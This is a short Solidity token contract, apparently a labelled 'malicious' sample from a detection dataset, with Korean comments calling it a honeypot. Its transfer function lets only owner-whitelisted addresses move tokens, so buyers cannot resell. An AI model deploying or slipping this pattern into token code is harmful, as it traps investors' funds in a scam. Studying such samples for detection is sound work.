// SPDX-License-Identifier: MIT
// LABEL: MALICIOUS
//
// 소유자에게만 유리한 비대칭 전송 제한이 있는 허니팟입니다. 소유자는 초기부터
// 허용 목록에 포함되어 토큰을 전송할 수 있지만, 일반 보유자는 소유자가 허용하지
// 않는 한 받은 토큰을 다시 전송할 수 없습니다.
// 근거: transfer()는 발신자의 허용 목록 등재를 요구하고, 목록은 소유자만 변경합니다.
pragma solidity ^0.8.20;

contract RewardPool {
    string public name = "RewardPool";
    string public symbol = "RWP";
    uint8  public constant decimals = 18;
    uint256 public totalSupply;
    address public owner;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool)    public whitelist;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        totalSupply = initialSupply;
        balanceOf[msg.sender] = initialSupply;
        whitelist[msg.sender] = true;
        emit Transfer(address(0), msg.sender, initialSupply);
    }

    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }

    function setWhitelist(address account, bool allowed) external onlyOwner {
        whitelist[account] = allowed;
    }

    // 허용되지 않은 보유자의 전송을 차단합니다.
    function transfer(address to, uint256 value) external returns (bool) {
        require(whitelist[msg.sender], "trading locked");
        require(to != address(0), "zero address");
        require(balanceOf[msg.sender] >= value, "insufficient");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
}
